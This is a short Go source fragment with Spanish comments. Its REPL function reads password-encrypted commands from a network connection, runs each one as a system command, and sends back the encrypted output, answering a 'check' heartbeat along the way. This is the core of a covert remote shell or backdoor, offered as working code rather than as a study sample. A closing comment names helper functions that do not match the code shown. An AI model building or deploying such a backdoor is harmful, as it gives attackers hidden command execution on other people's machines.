package core

import (
	"net"
)

// REPL maneja el ciclo de leer-evaluar-imprimir para una conexión de cliente dada.
func REPL(client net.Conn, password string) {
	for {
		buffer := make([]byte, 1024)
		n, _ := client.Read(buffer)
		if string(buffer[:n]) == "check" {
			continue
		} else {
			Commando, _ := Desencryptar(password, string(buffer[:n]))
			resultado, err := CMD(Commando)
			if err != nil {
				resultado = "Error al ejecutar el commando"
			}
			resultado, err = Encryptar(password, resultado)
			if err != nil {
				resultado = "Error"
			}
			_, err = client.Write([]byte(resultado))
			if err != nil {
				continue
			}
		}
	}
}

// Nota: Asegúrate de que las funciones `Receptor`, `Desencryptar`, y `Encryptar` están correctamente definidas
// en tu paquete, ya que no están incluidas en el fragmento de código original.
